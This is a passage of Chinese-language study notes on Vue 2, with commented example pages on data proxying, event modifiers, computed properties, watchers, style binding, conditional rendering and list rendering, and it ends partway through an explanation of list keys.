					return obj.x
				},
				set(value){
					obj.x = value
				}
			})
		</script>
	</body>
</html>
```



##### Vue中的数据代理

<img src="Akio's Book.assets/image-20220120192801287.png" alt="image-20220120192801287" style="zoom:57%;" />

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue中的数据代理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中的数据代理：
							通过vm对象来代理data对象中属性的操作（读/写）
				2.Vue中数据代理的好处：
							更加方便的操作data中的数据
				3.基本原理：
							通过Object.defineProperty()把data对象中所有属性添加到vm上。
							为每一个添加到vm上的属性，都指定一个getter/setter。
							在getter/setter内部去操作（读/写）data中对应的属性。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'DXC',
				address:'科技园'
			}
		})
	</script>
</html>
```



#### 事件处理

##### 事件的基本使用

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>事件的基本使用</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				事件的基本使用：
> 							1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
> 							2.事件的回调需要配置在methods对象中，最终会在vm上；
> 							3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
> 							4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
> 							5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2>欢迎来到{{name}}学习</h2>
> 			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
> 			<button @click="showInfo1">点我提示信息1（不传参）</button>
> 			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
> 			<!-- $event在此占位 -->
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				name:'尚硅谷',
> 			},
> 			methods:{
> 				showInfo1(event){
> 					// console.log(event.target.innerText)//event是原生js，拿到事件对象中的数据‘点我提示信息1（不传参）’
> 					// console.log(this) //此处的this是vm
> 					alert('同学你好！')
> 				},
> 				showInfo2(event,number){
> 					console.log(event,number)
> 					// console.log(event.target.innerText)
> 					// console.log(this) //此处的this是vm
> 					alert('同学你好！！')
> 				}
> 			}
> 		})
> 	</script>
> </html>
> ```



##### 事件修饰符

> https://www.bilibili.com/video/BV1Zy4y1K7SH?p=15&spm_id_from=pageDriver
>
> prevent : 阻止事件的默认行为 event.preventDefault()
>
> stop : 停止事件冒泡 event.stopPropagation
>
> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>事件修饰符</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 		<style>
> 			*{
> 				margin-top: 20px;
> 			}
> 			.demo1{
> 				height: 50px;
> 				background-color: skyblue;
> 			}
> 			.box1{
> 				padding: 5px;
> 				background-color: skyblue;
> 			}
> 			.box2{
> 				padding: 5px;
> 				background-color: orange;
> 			}
> 			.list{
> 				width: 200px;
> 				height: 200px;
> 				background-color: peru;
> 				overflow: auto;
> 			}
> 			li{
> 				height: 100px;
> 			}
> 		</style>
> 	</head>
> 	<body>
> 		<!-- 
> 				Vue中的事件修饰符：
> 						1.prevent：阻止默认事件（常用）；
> 						2.stop：阻止事件冒泡（常用）；
> 						3.once：事件只触发一次（常用）；
> 						4.capture：使用事件的捕获模式；
> 						5.self：只有event.target是当前操作的元素时才触发事件；
> 						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2>欢迎来到{{name}}学习</h2>
> 			<!-- 阻止默认事件（常用） -->
> 			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>
> 
> 			<!-- 阻止事件冒泡（常用） -->
> 			<div class="demo1" @click="showInfo">
> 				<button @click.stop="showInfo">点我提示信息</button>
> 				<!-- 修饰符可以连续写 -->
> 				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
> 			</div>
> 
> 			<!-- 事件只触发一次（常用） -->
> 			<button @click.once="showInfo">点我提示信息</button>
> 
> 			<!-- 使用事件的捕获模式 -->
> 			<div class="box1" @click.capture="showMsg(1)">
> 				div1
> 				<div class="box2" @click="showMsg(2)">
> 					div2
> 				</div>
> 			</div>
> 
> 			<!-- 只有event.target是当前操作的元素时才触发事件； -->
> 			<div class="demo1" @click.self="showInfo">
> 				<button @click="showInfo">点我提示信息</button>
> 			</div>
> 
> 			<!-- 事件执行顺序，滚轮滚动触发事件，执行事件回调方法demo，响应默认行为 -->
> 			<!-- passive:事件的默认行为立即执行，无需等待事件回调执行完毕； -->
> 			<ul @wheel.passive="demo" class="list"><!-- @wheel滚轮滚动 @scroll滚动条滚动 -->
> 				<li>1</li>
> 				<li>2</li>
> 				<li>3</li>
> 				<li>4</li>
> 			</ul>
> 
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				name:'尚硅谷'
> 			},
> 			methods:{
> 				showInfo(e){
> 					// e.preventDefault();//也可以阻止默认事件
> 					// e.stopPropagation()//也可以阻止事件冒泡
> 					alert('同学你好！')
> 					// console.log(e.target)
> 				},
> 				showMsg(msg){
> 					console.log(msg)
> 				},
> 				demo(){
> 					for (let i = 0; i < 10000; i++) {
> 						console.log('#')
> 					}
> 					console.log('累坏了')
> 				}
> 			}
> 		})
> 	</script>
> </html>
> ```



##### 键盘事件

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中常用的按键别名：
							回车 => enter
							大小写 =>caps-lock
							删除 => delete (捕获“删除”和“退格”键)
							退出 => esc
							空格 => space
							换行 => tab (特殊，必须配合keydown去使用)
							上 => up
							下 => down
							左 => left
							右 => right

				2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

				3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
							(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
							(2).配合keydown使用：正常触发事件。
							>>@keydown.ctrl.y表示当按下组合键ctrl+y的时候触发事件
						
				4.也可以使用keyCode去指定具体的按键（不推荐）

				5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```





#### 姓名案例

##### 插值语法实现

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>姓名案例_插值语法实现</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			姓：<input type="text" v-model="firstName"> <br/><br/>
> 			名：<input type="text" v-model="lastName"> <br/><br/>
> 			全名：<span>{{firstName.slice(0,3)}}-{{lastName}}</span>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				firstName:'张',
> 				lastName:'三'
> 			}
> 		})
> 	</script>
> </html>
> ```
>
> <img src="Akio's Book.assets/image-20220120205455855.png" alt="image-20220120205455855" style="zoom:43%;" /><img src="Akio's Book.assets/image-20220120205704535.png" alt="image-20220120205704535" style="zoom:50%;" />



##### methods实现

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>姓名案例_methods实现</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			姓：<input type="text" v-model="firstName"> <br/><br/>
> 			名：<input type="text" v-model="lastName"> <br/><br/>
> 			全名：<span>{{fullName()}}</span>	<!-- 插值中写方法 -->
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				firstName:'张',
> 				lastName:'三'
> 			},
> 			methods: {
> 				fullName(){
> 					console.log('@---fullName')
> 					return this.firstName + '-' + this.lastName
> 				}
> 			},
> 		})
> 	</script>
> </html>
> ```



##### 计算属性实现

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>姓名案例_计算属性实现</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 			计算属性：
> 					1.定义：要用的属性不存在，要通过已有属性计算得来。
> 					2.原理：底层借助了Object.defineproperty方法提供的getter和setter。
> 					3.get函数什么时候执行？
> 								(1).初次读取时会执行一次。
> 								(2).当依赖的数据发生改变时会被再次调用。
> 					4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
> 					5.备注：
> 							1.计算属性最终会出现在vm上，直接读取使用即可。
> 							2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
> 		 -->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			姓：<input type="text" v-model="firstName"> <br/><br/>
> 			名：<input type="text" v-model="lastName"> <br/><br/>
> 			测试：<input type="text" v-model="x"> <br/><br/>
> 			全名：<span>{{fullName}}</span> <br/><br/>
> 			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
> 			全名：<span>{{fullName}}</span> <br/><br/>
> 			全名：<span>{{fullName}}</span> -->
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				firstName:'张',
> 				lastName:'三',
> 				x:'你好'
> 			},
> 			methods: {
> 				demo(){
> 					
> 				}
> 			},
> 			computed:{
> 				fullName:{
> 					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
> 					//get有缓存机制，fullName有值后就会一直保存这个值，下次来了直接用
> 					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
> 					get(){
> 						console.log('get被调用了')
> 						// console.log(this) //此处的this是vm
> 						return this.firstName + '-' + this.lastName
> 					},
> 					//set什么时候调用? 当fullName被修改时。
> 					set(value){
> 						console.log('set',value)
> 						const arr = value.split('-')
> 						this.firstName = arr[0]
> 						this.lastName = arr[1]
> 					}
> 				}
> 			}
> 		})
> 	</script>
> </html>
> ```
>
> 计算属性的简写,一旦你确定你的这个属性只读不改才能用
>
> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>姓名案例_计算属性实现</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			姓：<input type="text" v-model="firstName"> <br/><br/>
> 			名：<input type="text" v-model="lastName"> <br/><br/>
> 			全名：<span>{{fullName}}</span> <br/><br/>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				firstName:'张',
> 				lastName:'三',
> 			},
> 			computed:{
> 				//完整写法
> 				/* fullName:{
> 					get(){
> 						console.log('get被调用了')
> 						return this.firstName + '-' + this.lastName
> 					},
> 					set(value){
> 						console.log('set',value)
> 						const arr = value.split('-')
> 						this.firstName = arr[0]
> 						this.lastName = arr[1]
> 					}
> 				} */
> 				//简写,当没有set，只有get的时候才能简写，如下就相当于上面只有get()的写法
> 				fullName(){
> 					console.log('get被调用了')
> 					return this.firstName + '-' + this.lastName
> 				}
> 			}
> 		})
> 	</script>
> </html>
> ```



#### 天气案例

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>天气案例</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<!-- {{isHot ? '炎热' : '凉爽'}} 也行-->
> 			<h2>今天天气很{{info}}</h2>
> 			<!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
> 			<!-- <button @click="isHot = !isHot">切换天气</button> -->
> 			<button @click="changeWeather">切换天气</button>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				isHot:true,
> 			},
> 			computed:{
> 				info(){
> 					return this.isHot ? '炎热' : '凉爽'
> 				}
> 			},
> 			methods: {
> 				changeWeather(){
> 					this.isHot = !this.isHot
> 				}
> 			},
> 		})
> 	</script>
> </html>
> ```



##### 监视属性

> ```html
> <!DOCTYPE html>
> <html>
>   <head>
>     <meta charset="UTF-8" />
>     <title>天气案例_监视属性</title>
>     <!-- 引入Vue -->
>     <script type="text/javascript" src="../js/vue.js"></script>
>   </head>
>   <body>
>     <!-- 
> 				监视属性watch：
> 					1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
> 					2.监视的属性必须存在，才能进行监视！！
> 					3.监视的两种写法：
> 							(1).new Vue时传入watch配置
> 							(2).通过vm.$watch监视
> 		 -->
>     <!-- 准备好一个容器-->
>     <div id="root">
>       <h2>今天天气很{{info}}</h2>
>       <button @click="changeWeather">切换天气</button>
>     </div>
>   </body>
> 
>   <script type="text/javascript">
>     Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
> 
>     const vm = new Vue({
>       el: "#root",
>       data: {
>         isHot: true,
>       },
>       computed: {
>         info() {
>           return this.isHot ? "炎热" : "凉爽";
>         },
>       },
>       methods: {
>         changeWeather() {
>           this.isHot = !this.isHot;
>         },
>       },
>       /* watch:{
> 				isHot:{
> 					immediate:true, //初始化时让handler调用一下
> 					//handler什么时候调用？当isHot发生改变时。
> 					handler(newValue,oldValue){
> 						console.log('isHot被修改了',newValue,oldValue)
> 					}
> 				}
> 			} */
>     });
> 
>     vm.$watch("isHot", {
>       immediate: true, //初始化时让handler调用一下
>       //handler什么时候调用？当isHot发生改变时。
>       handler(newValue, oldValue) {	//调用时会把旧/新的值都给我们
>         console.log("isHot被修改了", newValue, oldValue);
>       },
>     });
>   </script>
> </html>
> ```
>
> 深度监视,`deep:true`
>
> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>天气案例_深度监视</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				深度监视：
> 						(1).Vue中的watch默认不监测对象内部值的改变（一层）。
> 						(2).配置deep:true可以监测对象内部值改变（多层）。
> 				备注：
> 						(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
> 						(2).使用watch时根据数据的具体结构，决定是否采用深度监视。
> 		 -->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2>今天天气很{{info}}</h2>
> 			<button @click="changeWeather">切换天气</button>
> 			<hr/>
> 			<h3>a的值是:{{numbers.a}}</h3>
> 			<button @click="numbers.a++">点我让a+1</button>
> 			<h3>b的值是:{{numbers.b}}</h3>
> 			<button @click="numbers.b++">点我让b+1</button>
> 			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
> 			{{numbers.c.d.e}}
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				isHot:true,
> 				numbers:{
> 					a:1,
> 					b:1,
> 					c:{
> 						d:{
> 							e:100
> 						}
> 					}
> 				}
> 			},
> 			computed:{
> 				info(){
> 					return this.isHot ? '炎热' : '凉爽'
> 				}
> 			},
> 			methods: {
> 				changeWeather(){
> 					this.isHot = !this.isHot
> 				}
> 			},
> 			watch:{
> 				isHot:{
> 					// immediate:true, //初始化时让handler调用一下
> 					//handler什么时候调用？当isHot发生改变时。
> 					handler(newValue,oldValue){
> 						console.log('isHot被修改了',newValue,oldValue)
> 					}
> 				},
> 				//监视多级结构中某个属性的变化,直接写numbers.a可能报错，我们就是用原本的写法加上''
> 				/* 'numbers.a':{
> 					handler(){
> 						console.log('a被改变了')
> 					}
> 				} */
> 				//监视多级结构中所有属性的变化
> 				numbers:{
> 					deep:true,
> 					handler(){
> 						console.log('numbers改变了')
> 					}
> 				}
> 			}
> 		})
> 
> 	</script>
> </html>
> ```
>
> 监视属性，简写
>
> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>天气案例_监视属性_简写</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2>今天天气很{{info}}</h2>
> 			<button @click="changeWeather">切换天气</button>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				isHot:true,
> 			},
> 			computed:{
> 				info(){
> 					return this.isHot ? '炎热' : '凉爽'
> 				}
> 			},
> 			methods: {
> 				changeWeather(){
> 					this.isHot = !this.isHot
> 				}
> 			},
> 			watch:{
> 				//正常写法
> 				/* isHot:{
> 					// immediate:true, //初始化时让handler调用一下
> 					// deep:true,//深度监视
> 					handler(newValue,oldValue){
> 						console.log('isHot被修改了',newValue,oldValue)
> 					}
> 				}, */
> 				//简写:当只有handler，没有其他配置项的时候可以简写，如下的写法就等同于上述的没有配置项只有handler的
> 				/* isHot(newValue,oldValue){
> 					console.log('isHot被修改了',newValue,oldValue,this)
> 				} */
> 			}
> 		})
> 
> 		//正常写法
> 		/* vm.$watch('isHot',{
> 			immediate:true, //初始化时让handler调用一下
> 			deep:true,//深度监视
> 			handler(newValue,oldValue){
> 				console.log('isHot被修改了',newValue,oldValue)
> 			}
> 		}) */
> 
> 		//简写
> 		/* vm.$watch('isHot',(newValue,oldValue)=>{
> 			console.log('isHot被修改了',newValue,oldValue,this)
> 		}) */
> 
> 	</script>
> </html>
> ```



##### watch实现姓名案例

我们通过watch实现之前计算属性实现的姓名案例，来比较一下watch和computed

https://cn.vuejs.org/v2/guide/computed.html 官网指向

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>姓名案例_watch实现</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				computed和watch之间的区别：
> 						1.computed能完成的功能，watch都可以完成。
> 						2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作，如这里的延时1s展示操作。
> 				两个重要的小原则：
> 						1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
> 						2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			姓：<input type="text" v-model="firstName"> <br/><br/>
> 			名：<input type="text" v-model="lastName"> <br/><br/>
> 			全名：<span>{{fullName}}</span> <br/><br/>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				firstName:'张',
> 				lastName:'三',
> 				fullName:'张-三'
> 			},
> 			watch:{
> 				firstName(val){
> 					setTimeout(()=>{
> 						console.log(this)
> 						this.fullName = val + '-' + this.lastName
> 					},1000);
> 				},
> 				lastName(val){
> 					this.fullName = this.firstName + '-' + val
> 				}
> 			}
> 		})
> 	</script>
> </html>
> 
> 上面写了watch监听属性的异步操作，演示1s展示结果，如果是computed就做不了异步操作，如下
> computed:{
> 	fullName(){
> 		setTimeout:()=>{//这return直接返回给了window，而不是vm
> 			return this.firstName + '-' + this.lastName
> 		}
> 		//return ?? 这里才是返回给vm的
> 	}
> }
> ```
>
> > 两个重要的小原则：
> > 		1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
> > 		2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。



#### 绑定class/style样式

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			绑定样式：
					1. class样式
								写法:class="xxx" xxx可以是字符串、对象、数组。
										字符串写法适用于：类名不确定，要动态获取。
										对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
										数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
					2. style样式
								:style="{fontSize: xxx}"其中xxx是动态值。
								:style="[a,b]"其中a、b是样式对象。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 固定不变的放class中，需要动态选择显示的放:class中 -->
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				},
				styleObj:{
					fontSize: '40px',//注意：这种样式对象名称不能乱写，在css中font-size
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					// document.getElementById('demo').className = 'basic happy' 原生写法
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
    </script>
</html>
```

<img src="Akio's Book.assets/image-20220121094431900.png" alt="image-20220121094431900" style="zoom:80%;" />





#### 条件渲染

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				条件渲染：
							1.v-if
										写法：
												(1).v-if="表达式" 
												(2).v-else-if="表达式"
												(3).v-else="表达式"
										适用于：切换频率较低的场景。
										特点：不展示的DOM元素直接被移除。
										注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

							2.v-show
										写法：v-show="表达式"
										适用于：切换频率较高的场景。
										特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
								
							3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if 等同于java中的if-else ，注意使用的时候不允许被打断，要连着写 -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用，template不能与v-show一起用 -->
			<template v-if="n === 1">	<!-- 就避免了在每个子标签上写v-if -->
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```



#### 列表渲染

https://cn.vuejs.org/v2/api/#%E7%89%B9%E6%AE%8A-attribute

##### 基本列表

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>基本列表</title>
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				v-for指令:
> 						1.用于展示列表数据
> 						2.语法：v-for="(item, index) in xxx" :key="yyy"
> 						3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<!-- 遍历数组 -->
> 			<h2>人员列表（遍历数组）</h2>
> 			<ul>
> 				<li v-for="(p,index) of persons" :key="index">
> 					{{p.name}}-{{p.age}}
> 				</li>
> 			</ul>
> 
> 			<!-- 遍历对象 -->
> 			<h2>汽车信息（遍历对象）</h2>
> 			<ul>
> 				<li v-for="(value,k) of car" :key="k">
> 					{{k}}-{{value}}
> 				</li>
> 			</ul>
> 
> 			<!-- 遍历字符串 -->
> 			<h2>测试遍历字符串（用得少）</h2>
> 			<ul>
> 				<li v-for="(char,index) of str" :key="index">
> 					{{char}}-{{index}}
> 				</li>
> 			</ul>
> 			
> 			<!-- 遍历指定次数 -->
> 			<h2>测试遍历指定次数（用得少）</h2>
> 			<ul>
> 				<li v-for="(number,index) of 5" :key="index">
> 					{{index}}-{{number}}
> 				</li>
> 			</ul>
> 		</div>
> 
> 		<script type="text/javascript">
> 			Vue.config.productionTip = false
> 			
> 			new Vue({
> 				el:'#root',
> 				data:{
> 					persons:[
> 						{id:'001',name:'张三',age:18},
> 						{id:'002',name:'李四',age:19},
> 						{id:'003',name:'王五',age:20}
> 					],
> 					car:{
> 						name:'奥迪A8',
> 						price:'70万',
> 						color:'黑色'
> 					},
> 					str:'hello'
> 				}
> 			})
> 		</script>
> </html>
> ```



##### key的作用和原理

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=30&spm_id_from=pageDriver

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>key的原理</title>
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				面试题：react、vue中的key有什么作用？（key的内部原理）
> 						
> 						1. 虚拟DOM中key的作用：
> 										key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
> 										随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
> 										
> 						2.对比规则：
> 									(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
> 												①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
> 												②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
> 
> 									(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
> 												创建新的真实DOM，随后渲染到到页面。
> 												
> 						3. 用index作为key可能会引发的问题：
> 											1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
> 															会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
> 
> 											2. 如果结构中还包含输入类的DOM：
> 															会产生错误DOM更新 ==> 界面有问题。
> 
> 						4. 开发中如何选择key?:
